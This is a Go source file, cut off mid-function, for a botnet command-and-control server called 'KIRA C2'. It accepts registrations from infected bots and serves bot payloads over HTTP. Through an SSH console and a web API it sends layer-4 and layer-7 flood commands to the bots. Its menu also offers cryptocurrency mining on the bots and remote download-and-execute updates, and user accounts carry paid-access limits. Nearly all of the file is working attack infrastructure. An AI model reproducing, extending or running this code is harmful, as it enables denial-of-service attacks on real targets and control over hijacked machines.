package main

import (
	"bufio"
	"context"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"encoding/json"
	"encoding/pem"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/term"
)

type User struct {
	Password    string `json:"password"`
	MaxTime     int    `json:"max_time"`
	Concurrents int    `json:"concurrents"`
	Cooldown    int    `json:"cooldown"`
	VIP         bool   `json:"vip"`
	Reseller    bool   `json:"reseller"`
	Admin       bool   `json:"admin"`
	API         bool   `json:"api"`
	BetaAccess  bool   `json:"beta_access"`
	Expiry      int64  `json:"expiry"`
}

type UserDatabase map[string]User

const (
	userFile = "Users.json"
	userDir  = "Database"
	port     = "2222"
)

const skullArt = `
 ██╗  ██╗██╗██████╗   █████╗
 ██║ ██╔╝██║██╔══██╗ ██╔══██╗
 █████╔╝ ██║██████╔╝ ███████║
 ██╔═██╗ ██║██╔══██╗ ██╔══██║
 ██║  ██╗██║██║   ██║██║  ██║
 ╚═╝  ╚═╝╚═╝╚═╝   ╚═╝╚═╝  ╚═╝
`

const planetArt = `
 ██╗  ██╗██╗██████╗   █████╗
 ██║ ██╔╝██║██╔══██╗ ██╔══██╗
 █████╔╝ ██║██████╔╝ ███████║
 ██╔═██╗ ██║██╔══██╗ ██╔══██║
 ██║  ██╗██║██║   ██║██║  ██║
 ╚═╝  ╚═╝╚═╝╚═╝   ╚═╝╚═╝  ╚═╝
`

type GeoInfo struct {
	Country string
	City    string
}

var (
	botCount        int64
	onlineUsers     int64
	botsMu          sync.RWMutex
	bots            = make(map[string]*BotClient)
	activeAttacks   = make(map[string][]AttackInfo)
	activeAttacksMu sync.Mutex
	ColorRed        = "\033[1;31m"
	colorMu         sync.RWMutex
	lastAttackID    int64
	userDbMu        sync.RWMutex
	geoCache        = make(map[string]GeoInfo)
	geoCacheMu      sync.RWMutex
	bannedIPs       = make(map[string]bool)
	bannedMu        sync.RWMutex
	updateSuccess   int64
	updateFail      int64
	updateMu        sync.Mutex
)

type AttackInfo struct {
	ID       int64
	Target   string
	Port     string
	Method   string
	Duration int
	EndTime  int64
	BotAddrs []string
}

type BotClient struct {
	Conn           net.Conn
	OS             string
	Arch           string
	Threads        int
	RAM            int64
	Storage        int64
	Country        string
	Busy           bool
	Mode           string
	SpeedMBPS      float64
	Variant        string
	ReconnectCount int
}

type Config struct {
	CNCColor string `json:"cnc_color"`
}

func hexToRGB(hex string) (int, int, int) {
	hex = strings.TrimPrefix(hex, "#")
	if len(hex) == 3 {
		hex = string([]byte{hex[0], hex[0], hex[1], hex[1], hex[2], hex[2]})
	}
	if len(hex) > 6 {
		hex = hex[:6]
	}
	if len(hex) != 6 {
		return 255, 0, 0
	}
	r, _ := strconv.ParseInt(hex[0:2], 16, 64)
	g, _ := strconv.ParseInt(hex[2:4], 16, 64)
	b, _ := strconv.ParseInt(hex[4:6], 16, 64)
	return int(r), int(g), int(b)
}

func hexToANSI(hex string) string {
	r, g, b := hexToRGB(hex)
	return fmt.Sprintf("\033[38;2;%d;%d;%dm", r, g, b)
}

func loadConfig() Config {
	paths := []string{"config.json", "Server/config.json"}
	for _, p := range paths {
		file, err := os.ReadFile(p)
		if err != nil {
			continue
		}
		var config Config
		if err := json.Unmarshal(file, &config); err != nil {
			continue
		}
		return config
	}
	return Config{CNCColor: "#FF0000"}
}

func getColor() string {
	colorMu.RLock()
	defer colorMu.RUnlock()
	return ColorRed
}

func setupLogging() {
	os.MkdirAll("logs", 0755)
	f, err := os.OpenFile("logs/cnc.log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}
	mw := io.MultiWriter(os.Stdout, f)
	log.SetOutput(mw)
}

func main() {
	setupLogging()
	log.Println("--- KIRA CNC STARTING ---")
	cfg := loadConfig()
	colorMu.Lock()
	ColorRed = hexToANSI(cfg.CNCColor)
	colorMu.Unlock()
	if err := initStorage(); err != nil {
		log.Fatalf("Failed to init storage: %v", err)
	}
	config := &ssh.ServerConfig{
		PasswordCallback: func(c ssh.ConnMetadata, pass []byte) (*ssh.Permissions, error) {
			users, err := loadUsers()
			if err != nil {
				return nil, err
			}
			if user, ok := users[c.User()]; ok && user.Password == string(pass) {
				if time.Now().Unix() > user.Expiry && c.User() != "root" {
					return nil, fmt.Errorf("account expired")
				}
				return nil, nil
			}
			return nil, fmt.Errorf("password rejected")
		},
	}
	hostKey, err := loadOrGenerateHostKey()
	if err != nil {
		log.Fatalf("Failed to load/generate host key: %v", err)
	}
	config.AddHostKey(hostKey)
	go func() {
		l, err := net.Listen("tcp", "0.0.0.0:9111")
		if err != nil {
			log.Fatalf("Failed to bind bin server: %v", err)
		}
		log.Printf("Bin Server listening on 0.0.0.0:9111")
		for {
			c, err := l.Accept()
			if err != nil {
				continue
			}
			go handleBinConnection(c)
		}
	}()
	go func() {
		log.Printf("Payload Server listening on 0.0.0.0:80")
		http.Handle("/", http.FileServer(http.Dir("./bin")))
		if err := http.ListenAndServe("0.0.0.0:80", nil); err != nil {
			log.Printf("Payload server exited: %v", err)
		}
	}()

	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/api", handleAPI)
		log.Printf("API Server listening on 0.0.0.0:3333")
		if err := http.ListenAndServe("0.0.0.0:3333", mux); err != nil {
			log.Printf("API server exited: %v", err)
		}
	}()

	listener, err := net.Listen("tcp", "0.0.0.0:"+port)
	if err != nil {
		log.Fatalf("Failed to bind SSH server: %v", err)
	}
	log.Printf("SSH Server listening on 0.0.0.0:%s", port)
	for {
		c, err := listener.Accept()
		if err != nil {
			continue
		}
		go handleSSHConnection(c, config)
	}
}

func handleAPI(w http.ResponseWriter, r *http.Request) {
	q := r.URL.Query()
	username := q.Get("username")
	password := q.Get("password")
	method := strings.ToLower(q.Get("method"))
	target := q.Get("target")
	portStr := q.Get("port")
	durationStr := q.Get("duration")
	botsStr := q.Get("bots")

	users, err := loadUsers()
	if err != nil || users == nil {
		w.Write([]byte("Server error"))
		return
	}
	user, ok := users[username]
	if !ok || user.Password != password {
		w.Write([]byte("Invalid credentials"))
		return
	}
	if !user.API && username != "root" {
		w.Write([]byte("API access denied"))
		return
	}

	if time.Now().Unix() > user.Expiry && username != "root" {
		w.Write([]byte("Account expired"))
		return
	}

	dur, _ := strconv.Atoi(durationStr)
	if dur <= 0 {
		w.Write([]byte("Invalid duration"))
		return
	}
	if dur > user.MaxTime && username != "root" {
		w.Write([]byte("Time limit exceeded"))
		return
	}

	activeAttacksMu.Lock()
	if len(activeAttacks[username]) >= user.Concurrents {
		activeAttacksMu.Unlock()
		w.Write([]byte("Concurrent limit reached"))
		return
	}

	id := atomic.AddInt64(&lastAttackID, 1)
	if portStr == "" {
		portStr = "80"
	}
	botLimit, _ := strconv.Atoi(botsStr)
	var botAddrs []string
	sentTo := "all"
	requireMode := ""
	if isL4Method(method) {
		requireMode = "l4"
	} else if isL7Method(method) || isScriptMethod(method) {
		requireMode = "l7"
	}
	if botLimit > 0 {
		cmd := fmt.Sprintf("%s %s %s %d", method, target, portStr, dur)
		var sent int
		botAddrs, sent = broadcastToN(cmd, botLimit, requireMode)
		if sent == 0 {
			activeAttacksMu.Unlock()
			w.Write([]byte("No free bots available"))
			return
		}
		sentTo = strconv.Itoa(sent)
	} else {
		botAddrs, _ = broadcastAll(fmt.Sprintf("%s %s %s %d", method, target, portStr, dur), requireMode)
		sentTo = strconv.Itoa(len(botAddrs))
	}
	atk := AttackInfo{ID: id, Target: target, Port: portStr, Method: method, Duration: dur, EndTime: time.Now().Unix() + int64(dur), BotAddrs: botAddrs}
	activeAttacks[username] = append(activeAttacks[username], atk)
	activeAttacksMu.Unlock()

	go func(user string, aid int64, d int, baddrs []string) {
		time.Sleep(time.Duration(d) * time.Second)
		activeAttacksMu.Lock()
		atks := activeAttacks[user]
		found := false
		for i, a := range atks {
			if a.ID == aid {
				activeAttacks[user] = append(atks[:i], atks[i+1:]...)
				found = true
				break
			}
		}
		activeAttacksMu.Unlock()
		if found && len(baddrs) > 0 {
			freeBots(baddrs)
		}
	}(username, id, dur, botAddrs)

	w.Write([]byte(fmt.Sprintf("Attack ID %d sent to %s bots", id, sentTo)))
}

func lookupGeo(host string) GeoInfo {
	gi := GeoInfo{Country: "Unknown", City: "Unknown"}
	if host == "127.0.0.1" || strings.HasPrefix(host, "10.") || strings.HasPrefix(host, "192.168.") || strings.HasPrefix(host, "172.") {
		gi.Country = "LAN"
		gi.City = "LAN"
		return gi
	}
	c := &http.Client{Timeout: 5 * time.Second}
	resp, err := c.Get("http://ip-api.com/json/" + host + "?fields=country,city")
	if err != nil {
		return gi
	}
	defer resp.Body.Close()
	var geo struct {
		Country string `json:"country"`
		City    string `json:"city"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&geo); err != nil {
		return gi
	}
	if geo.Country != "" {
		gi.Country = geo.Country
	}
	if geo.City != "" {
		gi.City = geo.City
	}
	return gi
}

func getCountry(ip string) string {
	host, _, err := net.SplitHostPort(ip)
	if err != nil {
		host = ip
	}
	geoCacheMu.RLock()
	if g, ok := geoCache[host]; ok {
		geoCacheMu.RUnlock()
		return g.Country
	}
	geoCacheMu.RUnlock()
	gi := lookupGeo(host)
	geoCacheMu.Lock()
	geoCache[host] = gi
	geoCacheMu.Unlock()
	return gi.Country
}

func getPublicIP() string {
	client := &http.Client{Timeout: 5 * time.Second}
	resp, err := client.Get("https://api.ipify.org")
	if err != nil {
		return "127.0.0.1"
	}
	defer resp.Body.Close()
	ip, _ := io.ReadAll(resp.Body)
	return strings.TrimSpace(string(ip))
}

func handleBinConnection(conn net.Conn) {
	if tcp, ok := conn.(*net.TCPConn); ok {
		tcp.SetKeepAlive(true)
		tcp.SetKeepAlivePeriod(10 * time.Second)
	}

	scanner := bufio.NewScanner(conn)
	var osName, archName string = "Unknown", "Unknown"
	var threads int = 1
	var ramMB, diskMB int64
	var botMode string = "full"
	var speedMBPS float64
	var variant string = "unknown"
	if scanner.Scan() {
		parts := strings.Fields(scanner.Text())
		if len(parts) >= 3 && parts[0] == "REGISTER" {
			osName, archName = parts[1], parts[2]
			if len(parts) >= 4 {
				threads, _ = strconv.Atoi(parts[3])
			}
			if len(parts) >= 5 {
				ramMB, _ = strconv.ParseInt(parts[4], 10, 64)
			}
			if len(parts) >= 6 {
				diskMB, _ = strconv.ParseInt(parts[5], 10, 64)
			}
			if len(parts) >= 7 {
				botMode = parts[6]
			}
			if len(parts) >= 8 {
				speedMBPS, _ = strconv.ParseFloat(parts[7], 64)
			}
			if len(parts) >= 9 {
				variant = parts[8]
			}
		}
	}

	host, _, _ := net.SplitHostPort(conn.RemoteAddr().String())
	bannedMu.RLock()
	if bannedIPs[host] {
		bannedMu.RUnlock()
		conn.Close()
		return
	}
	bannedMu.RUnlock()
	country := getCountry(host)
	botsMu.Lock()
	reconnects := 0
	wasBusy := false
	if old, ok := bots[host]; ok {
		wasBusy = old.Busy
		reconnects = old.ReconnectCount + 1
		old.Conn.Close()
		delete(bots, host)
		atomic.AddInt64(&botCount, -1)
	}
	bots[host] = &BotClient{Conn: conn, OS: osName, Arch: archName, Threads: threads, RAM: ramMB, Storage: diskMB, Country: country, Mode: botMode, SpeedMBPS: speedMBPS, Variant: variant, ReconnectCount: reconnects, Busy: wasBusy}
	botsMu.Unlock()
	atomic.AddInt64(&botCount, 1)
	log.Printf("Bot connected: %s (OS: %s, Arch: %s, Threads: %d, RAM: %dMB, Disk: %dMB, Country: %s)", host, osName, archName, threads, ramMB, diskMB, country)
	defer func() {
		botsMu.Lock()
		if c, ok := bots[host]; ok && c.Conn == conn {
			delete(bots, host)
			atomic.AddInt64(&botCount, -1)
		}
		botsMu.Unlock()
		conn.Close()
		log.Printf("Bot disconnected: %s", host)
	}()
	for scanner.Scan() {
		line := scanner.Text()
		if line == "UPDATE_OK" {
			atomic.AddInt64(&updateSuccess, 1)
		} else if line == "UPDATE_FAIL" {
			atomic.AddInt64(&updateFail, 1)
		}
	}
}

func isL4Method(method string) bool {
	switch method {
	case "udp", "udp-bypass", "pps", "udp-pps", "tcp", "tcp-bypass", "tcp-stomp", "syn", "ack", "dns", "fortnite", "minecraft", "ssh", "discord":
		return true
	}
	return false
}

func isL7Method(method string) bool {
	switch method {
	case "http", "http-bypass":
		return true
	}
	return false
}

func isScriptMethod(method string) bool {
	switch method {
	case "browser", "cache-bp", "cf-bypass", "cfpro", "cloudstorm", "erebus", "fatzx", "h2reset", "http-huricane", "httpkill", "hybrid", "ngtuan", "priv-flood", "tls", "xreset", "zenith":
		return true
	}
	return false
}

func modeMatch(botMode, requireMode string) bool {
	if requireMode == "" || botMode == "full" {
		return true
	}
	return botMode == requireMode
}

func broadcast(cmd string) {
	botsMu.RLock()
	var conns []net.Conn
	for _, client := range bots {
		conns = append(conns, client.Conn)
	}
	botsMu.RUnlock()

	payload := []byte(cmd + "\n")
	for _, c := range conns {
		c.Write(payload)
	}
}

func broadcastAll(cmd string, requireMode string) ([]string, int) {
	botsMu.Lock()
	type bw struct {
		addr string
		conn net.Conn
	}
	var targets []bw
	for addr, client := range bots {
		if !modeMatch(client.Mode, requireMode) || client.Busy {
			continue
		}
		client.Busy = true
		targets = append(targets, bw{addr: addr, conn: client.Conn})
	}
	botsMu.Unlock()

	payload := []byte(cmd + "\n")
	var addrs []string
	for _, t := range targets {
		t.conn.Write(payload)
		addrs = append(addrs, t.addr)
	}
	return addrs, len(targets)
}

func broadcastToN(cmd string, count int, requireMode string) ([]string, int) {
	botsMu.Lock()
	type botWrite struct {
		addr string
		conn net.Conn
	}
	var targets []botWrite
	for addr, client := range bots {
		if len(targets) >= count {
			break
		}
		if client.Busy || !modeMatch(client.Mode, requireMode) {
			continue
		}
		client.Busy = true
		targets = append(targets, botWrite{addr: addr, conn: client.Conn})
	}
	botsMu.Unlock()

	payload := []byte(cmd + "\n")
	var addrs []string
	for _, t := range targets {
		t.conn.Write(payload)
		addrs = append(addrs, t.addr)
	}
	return addrs, len(targets)
}

func freeBots(addrs []string) {
	botsMu.Lock()
	defer botsMu.Unlock()
	for _, addr := range addrs {
		if c, ok := bots[addr]; ok {
			c.Busy = false
		}
	}
}

func countFreeBots() (busy, free int) {
	botsMu.RLock()
	defer botsMu.RUnlock()
	for _, c := range bots {
		if c.Busy {
			busy++
		} else {
			free++
		}
	}
	return
}

func countModes() (l4only, l7only, full int) {
	botsMu.RLock()
	defer botsMu.RUnlock()
	for _, c := range bots {
		switch c.Mode {
		case "l4":
			l4only++
		case "l7":
			l7only++
		default:
			full++
		}
	}
	return
}

func totalSpeed() float64 {
	botsMu.RLock()
	defer botsMu.RUnlock()
	var total float64
	for _, c := range bots {
		total += c.SpeedMBPS
	}
	return total
}

func totalSpeedByArch() map[string]struct {
	count int
	speed float64
} {
	botsMu.RLock()
	defer botsMu.RUnlock()
	out := make(map[string]struct {
		count int
		speed float64
	})
	for _, c := range bots {
		a := out[c.Arch]
		a.count++
		a.speed += c.SpeedMBPS
		out[c.Arch] = a
	}
	return out
}

func parseBotsFlag(args []string) ([]string, int) {
	out := make([]string, 0, len(args))
	n := 0
	for _, a := range args {
		if strings.HasPrefix(a, "bots=") {
			n, _ = strconv.Atoi(strings.TrimPrefix(a, "bots="))
		} else {
			out = append(out, a)
		}
	}
	return out, n
}

func handleSSHConnection(nConn net.Conn, config *ssh.ServerConfig) {
	conn, chans, reqs, err := ssh.NewServerConn(nConn, config)
	if err != nil {
		return
	}
	defer conn.Close()
	log.Printf("User %q logged in from %s", conn.User(), nConn.RemoteAddr())
	go ssh.DiscardRequests(reqs)
	for newChannel := range chans {
		if newChannel.ChannelType() != "session" {
			newChannel.Reject(ssh.UnknownChannelType, "unknown")
			continue
		}
		channel, requests, _ := newChannel.Accept()
		go handleSession(channel, requests, conn.User())
	}
}

func handleSession(channel ssh.Channel, requests <-chan *ssh.Request, username string) {
	atomic.AddInt64(&onlineUsers, 1)
	defer atomic.AddInt64(&onlineUsers, -1)
	defer channel.Close()

	done := make(chan struct{})
	defer close(done)

	go func() {
		ticker := time.NewTicker(1 * time.Second)
		defer ticker.Stop()
		for {
			select {
			case <-done:
				return
			case <-ticker.C:
			}
			activeAttacksMu.Lock()
			globalAttacks := 0
			for _, v := range activeAttacks {
				globalAttacks += len(v)
			}
			activeAttacksMu.Unlock()
			busy, free := countFreeBots()
			l4only, l7only, fullcnt := countModes()
			title := fmt.Sprintf("\033]0;KIRA C2	 |Bots : %d | Free : %d | Busy : %d | L4 : %d | L7 : %d | Full : %d | Attacks : %d | Speed : %.0f Mbps\007",
				atomic.LoadInt64(&botCount), free, busy, l4only, l7only, fullcnt, globalAttacks, totalSpeed())
			channel.Write([]byte(title))
		}
	}()

	cRed := getColor()
	prompt := fmt.Sprintf("%s%s%s@kira~# \033[0m", cRed, username, "\033[0m")
	term := term.NewTerminal(channel, prompt)

	go func() {
		for req := range requests {
			if req.Type == "pty-req" {
				term.SetSize(82, 25)
			}
			req.Reply(true, nil)
		}
	}()
	term.Write([]byte(planetBanner()))

	for {
		line, err := term.ReadLine()
		if err != nil {
			break
		}
		args := strings.Fields(line)
		if len(args) == 0 {
			continue
		}
		cmd := strings.ToLower(args[0])

		switch cmd {
		case "ongoing":
			activeAttacksMu.Lock()
			var attackLines []string
			for user, atks := range activeAttacks {
				if username != "root" && user != username {
					continue
				}
				for _, a := range atks {
					bc := "all"
					if len(a.BotAddrs) > 0 {
						bc = strconv.Itoa(len(a.BotAddrs))
					}
					rem := a.EndTime - time.Now().Unix()
					if rem < 0 {
						rem = 0
					}
					line := fmt.Sprintf("%-5d | %-20s | %-10s | %-10d | %-6s", a.ID, a.Target, a.Port, rem, bc)
					if username == "root" {
						line += " | " + user
					}
					attackLines = append(attackLines, line)
				}
			}
			activeAttacksMu.Unlock()

			term.Write([]byte(fmt.Sprintf("%-5s | %-20s | %-10s | %-10s | %-6s", "ID", "Target", "Port", "Time", "Bots")))
			if username == "root" {
				term.Write([]byte(" | User"))
			}
			term.Write([]byte("\r\n" + strings.Repeat("-", 70) + "\r\n"))
			for _, line := range attackLines {
				term.Write([]byte(line + "\r\n"))
			}

		case "stopatk":
			if len(args) < 2 {
				term.Write([]byte("Usage: stopatk [ID]\r\n"))
				continue
			}
			id, _ := strconv.ParseInt(args[1], 10, 64)
			found := false
			activeAttacksMu.Lock()
			for user, atks := range activeAttacks {
				for i, a := range atks {
					if a.ID == id {
						if user == username || username == "root" {
							broadcast("stop " + a.Target)
							if len(a.BotAddrs) > 0 {
								freeBots(a.BotAddrs)
							}
							activeAttacks[user] = append(atks[:i], atks[i+1:]...)
							term.Write([]byte(fmt.Sprintf("Attack %d stopped.\r\n", id)))
						} else {
							term.Write([]byte("This is not your attack.\r\n"))
						}
						found = true
						break
					}
				}
				if found {
					break
				}
			}
			activeAttacksMu.Unlock()
			if !found {
				term.Write([]byte("Attack ID not found.\r\n"))
			}

		case "admin":
			if username == "root" {
				term.Write([]byte("Commands: users, adduser, deluser, botstats\r\n"))
			}
		case "users":
			if username == "root" {
				db, _ := loadUsers()
				for name, u := range db {
					term.Write([]byte(fmt.Sprintf("%s | Expiry: %d\r\n", name, u.Expiry)))
				}
			}
		case "adduser":
			if username == "root" {
				db, err := loadUsers()
				if err != nil || db == nil {
					db = make(UserDatabase)
				}
				term.Write([]byte("User: "))
				n, _ := term.ReadLine()
				if n == "" || n == "root" {
					term.Write([]byte("Invalid username.\r\n"))
					continue
				}
				if _, exists := db[n]; exists {
					term.Write([]byte("User already exists.\r\n"))
					continue
				}
				term.Write([]byte("Pass: "))
				p, _ := term.ReadLine()
				db[n] = User{Password: p, MaxTime: 3600, Concurrents: 10, Expiry: time.Now().Add(30 * 24 * time.Hour).Unix()}
				saveUsers(db)
				term.Write([]byte("Added.\r\n"))
			}
		case "deluser":
			if username == "root" && len(args) > 1 {
				db, err := loadUsers()
				if err != nil || db == nil {
					db = make(UserDatabase)
				}
				delete(db, args[1])
				saveUsers(db)
				term.Write([]byte("Deleted.\r\n"))
			}
		case "proxies", "adduserproxy", "deluserproxy":
			term.Write([]byte("Proxy relay removed in this version.\r\n"))
		case "help", "?":
			term.Write([]byte("\033[2J\033[H\033[1;37m───── commands ─────\r\n"))
			term.Write([]byte("help/?    -> show this menu\r\n"))
			term.Write([]byte("methods   -> list attack methods\r\n"))
			term.Write([]byte("ongoing   -> list running attacks\r\n"))
			term.Write([]byte("stopatk   -> stop attack by id\r\n"))
			term.Write([]byte("botstatus -> show free/busy bots\r\n"))
			term.Write([]byte("countries -> bots per country\r\n"))
			term.Write([]byte("cpu       -> cpu cores by architecture\r\n"))
			term.Write([]byte("bigbot    -> show the highest spec bot\r\n"))
			term.Write([]byte("clear     -> clear the screen\r\n"))
			term.Write([]byte("bots      -> bot statistics\r\n"))
			term.Write([]byte("botips    -> list bot IPs and reconnect counts\r\n"))
			term.Write([]byte("exploits  -> bot exploits per variant\r\n"))
			if username == "root" {
				term.Write([]byte("admin     -> admin commands\r\n"))
				term.Write([]byte("users     -> list all users\r\n"))
				term.Write([]byte("adduser   -> add a user\r\n"))
				term.Write([]byte("deluser   -> delete a user\r\n"))
				term.Write([]byte("payload   -> build bot binaries (append \"l4\" for L4-only)\r\n"))
				term.Write([]byte("monero    -> start mining on bots\r\n"))
				term.Write([]byte("bots      -> show bot stats\r\n"))
				term.Write([]byte("ban       -> ban bot by IP\r\n"))
				term.Write([]byte("unban     -> unban bot by IP\r\n"))
				term.Write([]byte("update    -> download & exec new binary on bots (shows success/fail)\r\n"))
			}
			term.Write([]byte("\r\nusage: <method> <target> <port> <time> [bots=N]  (layer4)\r\n       <method> <url> <time> [bots=N]               (layer7)\r\n"))
		case "methods":
			term.Write([]byte("\033[2J\033[H"))
			// L4 methods + Layer 7
			l4 := []string{"    ack", "    syn", "    tcp", "    udp", "    udp-bypass", "    pps / udp-pps", "    tcp-bypass", "    tcp-stomp", "    dns", "    fortnite", "    minecraft", "    ssh", "    discord", "Layer 7:", "    http", "    http-bypass"}
			// JS script methods for L7 Servers
			l7s := []string{"    browser", "    cache-bp", "    cf-bypass", "    cfpro", "    cloudstorm", "    erebus", "    fatzx", "    h2reset", "    http-huricane", "    httpkill", "    hybrid", "    ngtuan", "    priv-flood", "    tls", "    xreset", "    zenith"}
			pad := "                     "
			max := len(l4)
			if len(l7s) > max {
				max = len(l7s)
			}
			term.Write([]byte("Layer 4:" + pad + "L7 Servers:\r\n"))
			for i := 0; i < max; i++ {
				left := ""
				if i < len(l4) {
					left = l4[i]
				}
				right := ""
				if i < len(l7s) {
					right = l7s[i]
				}
				term.Write([]byte(left + pad[len(left):] + right + "\r\n"))
			}
			term.Write([]byte("\r\n"))
		case "botstatus":
			busy, free := countFreeBots()
			l4only, l7only, fullcnt := countModes()
			total := busy + free
			var totalRAM, totalCores int64
			botsMu.RLock()
			for _, c := range bots {
				totalRAM += c.RAM
				totalCores += int64(c.Threads)
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("Free: %d | Busy: %d | Total: %d | RAM: %d MB | Cores: %d | L4: %d | L7: %d | Full: %d | Speed: %.0f Mbps\r\n", free, busy, total, totalRAM, totalCores, l4only, l7only, fullcnt, totalSpeed())))
		case "speed":
			ts := totalSpeed()
			term.Write([]byte(fmt.Sprintf("Total bot speed: %.0f Mbps / %.2f Gbps\r\n", ts, ts/1000)))
			term.Write([]byte(fmt.Sprintf("%-12s %-8s %-12s\r\n", "IP", "Bots", "Speed(Mbps)")))
			botsMu.RLock()
			for addr, c := range bots {
				if c.SpeedMBPS > 0 {
					term.Write([]byte(fmt.Sprintf("%-12s %-8d %-12.0f\r\n", addr, 1, c.SpeedMBPS)))
				}
			}
			botsMu.RUnlock()
		case "countries", "country":
			countryCounts := make(map[string]int)
			total := 0
			botsMu.RLock()
			for _, client := range bots {
				cn := client.Country
				if cn == "" {
					cn = "Unknown"
				}
				countryCounts[cn]++
				total++
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("%-20s %s\r\n", "Country", "Bots")))
			term.Write([]byte(strings.Repeat("-", 30) + "\r\n"))
			for cn, c := range countryCounts {
				term.Write([]byte(fmt.Sprintf("%-20s %d\r\n", cn, c)))
			}
			term.Write([]byte(strings.Repeat("-", 30) + "\r\n"))
			term.Write([]byte(fmt.Sprintf("%-20s %d\r\n", "TOTAL", total)))
		case "cpu":
			type archInfo struct {
				count int
				cores int
			}
			archStats := make(map[string]*archInfo)
			var totalCores, totalBots int
			botsMu.RLock()
			for _, client := range bots {
				s := archStats[client.Arch]
				if s == nil {
					s = &archInfo{}
					archStats[client.Arch] = s
				}
				s.count++
				s.cores += client.Threads
				totalCores += client.Threads
				totalBots++
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("%-12s %-6s %-6s\r\n", "Arch", "Bots", "Cores")))
			term.Write([]byte(strings.Repeat("-", 26) + "\r\n"))
			for arch, s := range archStats {
				term.Write([]byte(fmt.Sprintf("%-12s %-6d %-6d\r\n", arch, s.count, s.cores)))
			}
			term.Write([]byte(strings.Repeat("-", 26) + "\r\n"))
			term.Write([]byte(fmt.Sprintf("%-12s %-6d %-6d\r\n", "TOTAL", totalBots, totalCores)))
		case "bigbot":
			botsMu.RLock()
			var best *BotClient
			for _, client := range bots {
				if best == nil {
					best = client
					continue
				}
				score := client.Threads*1000 + int(client.RAM/10) + int(client.Storage/100)
				bestScore := best.Threads*1000 + int(best.RAM/10) + int(best.Storage/100)
				if score > bestScore {
					best = client
				}
			}
			if best != nil {
				addr := ""
				for a, c := range bots {
					if c == best {
						addr = a
						break
					}
				}
				term.Write([]byte(fmt.Sprintf("Biggest bot: %s\r\n", addr)))
				term.Write([]byte(fmt.Sprintf("Arch: %s | Cores: %d | RAM: %d MB | Disk: %d MB | Country: %s\r\n", best.Arch, best.Threads, best.RAM, best.Storage, best.Country)))
			} else {
				term.Write([]byte("No bots connected.\r\n"))
			}
			botsMu.RUnlock()
		case "bots", "botstats":
			term.Write([]byte("\033[2J\033[H"))
			type ba struct {
				count int
				cores int
				ram   int64
				disk  int64
				speed float64
			}
			typeMap := make(map[string]*ba)
			var total, totalCores int64
			var totalRAM, totalDisk int64
			var l4count, l7count, fullcount int
			botsMu.RLock()
			for _, client := range bots {
				key := client.Variant + " " + client.Arch
				s := typeMap[key]
				if s == nil {
					s = &ba{}
					typeMap[key] = s
				}
				s.count++
				s.cores += client.Threads
				s.ram += client.RAM
				s.disk += client.Storage
				s.speed += client.SpeedMBPS
				total++
				totalCores += int64(client.Threads)
				totalRAM += client.RAM
				totalDisk += client.Storage
				switch client.Mode {
				case "l4":
					l4count++
				case "l7":
					l7count++
				default:
					fullcount++
				}
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("%-25s %-6s %-6s %-10s %-10s %-12s\r\n", "Type", "Bots", "Cores", "RAM(MB)", "Disk(MB)", "Speed(Mbps)")))
			for key, s := range typeMap {
				term.Write([]byte(fmt.Sprintf("%-25s %-6d %-6d %-10d %-10d %-12.0f\r\n", key, s.count, s.cores, s.ram, s.disk, s.speed)))
			}
			term.Write([]byte(fmt.Sprintf("\r\nTotal: %d bots | %d cores | %d MB RAM | %d MB Disk\r\n", total, totalCores, totalRAM, totalDisk)))
			term.Write([]byte(fmt.Sprintf("Modes: %d full | %d L4 | %d L7\r\n", fullcount, l4count, l7count)))
			if total > 0 {
				ts := totalSpeed()
				term.Write([]byte(fmt.Sprintf("Total speed: %.0f Mbps / %.2f Gbps\r\n", ts, ts/1000)))
			}
		case "exploits", "exploit":
			expMap := make(map[string]int)
			botsMu.RLock()
			for _, client := range bots {
				expMap[client.Variant]++
			}
			botsMu.RUnlock()
			term.Write([]byte(fmt.Sprintf("%-25s %-6s\r\n", "Exploit", "Bots")))
			for exp, cnt := range expMap {
				term.Write([]byte(fmt.Sprintf("%-25s %-6d\r\n", exp, cnt)))
			}
		case "ram":
			ramFilter := ""
			if len(args) >= 2 {
				ramFilter = args[1]
			}
			type ramInfo struct {
				count int
				total int64
				min   int64
				max   int64
			}
			ramStats := make(map[string]*ramInfo)
			var grandTotal, grandCount int64
			var grandMin int64 = 1<<63 - 1
			var grandMax int64
			botsMu.RLock()
			for _, client := range bots {
				if ramFilter != "" && client.Variant != ramFilter {
					continue
				}
				key := client.Variant
				s := ramStats[key]
				if s == nil {
					s = &ramInfo{}
					ramStats[key] = s
				}
				s.count++
				s.total += client.RAM
				if s.min == 0 || client.RAM < s.min {
					s.min = client.RAM
				}
				if client.RAM > s.max {
					s.max = client.RAM
				}
				grandCount++
				grandTotal += client.RAM
				if client.RAM < grandMin {
					grandMin = client.RAM
				}
				if client.RAM > grandMax {
					grandMax = client.RAM
				}
			}
			botsMu.RUnlock()
			if grandMin == 1<<63-1 {
				grandMin = 0
			}
			if len(ramStats) > 1 || ramFilter == "" {
				term.Write([]byte(fmt.Sprintf("%-25s %-7s %-12s %-8s %-8s\r\n", "Exploit", "Bots", "Total(MB)", "Min(MB)", "Max(MB)")))
				term.Write([]byte(strings.Repeat("-", 62) + "\r\n"))
				for key, s := range ramStats {
					term.Write([]byte(fmt.Sprintf("%-25s %-7d %-12d %-8d %-8d\r\n", key, s.count, s.total, s.min, s.max)))
				}
				term.Write([]byte(strings.Repeat("-", 62) + "\r\n"))
			}
			avg := float64(grandTotal) / float64(grandCount)
			term.Write([]byte(fmt.Sprintf("Total bots        : %d\r\n", grandCount)))
			term.Write([]byte(fmt.Sprintf("Total RAM         : %d MB (%.2f GB)\r\n", grandTotal, float64(grandTotal)/1024.0)))
